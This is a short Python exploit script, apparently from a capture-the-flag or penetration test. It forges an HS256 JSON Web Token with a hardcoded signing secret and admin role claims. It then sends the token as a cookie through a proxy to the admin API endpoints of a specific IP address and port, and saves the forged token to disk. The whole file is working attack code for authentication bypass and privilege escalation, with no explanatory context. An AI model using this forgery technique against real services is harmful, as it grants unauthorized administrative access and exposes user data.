import sys, os, json, hmac, hashlib, base64, time, urllib.parse
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px

BASE = "http://103.163.47.230:34414"
SECRET = "HTU@2026"


def b64e(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def make(payload, secret=SECRET):
    h = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64e(json.dumps(payload, separators=(",", ":")))
    s = b64e(hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + s


now = int(time.time())
payload = {"sub": "1", "name": "admin", "role": "admin", "iat": now, "exp": now + 604800}
tok = make(payload)
print("forged:", tok[:60], "...")

OP = px.opener("http://143.246.138.227:80")
OP.addheaders = [("User-Agent", "Mozilla/5.0"), ("Cookie", "htu_token=" + tok)]
for path in ["/api/me", "/api/admin/users", "/api/reports"]:
    s, h, b = px.get(BASE + path, OP)
    print("==", path, s, b[:600])
json.dump({"token": tok}, open("admin_token.json", "w"), indent=1)
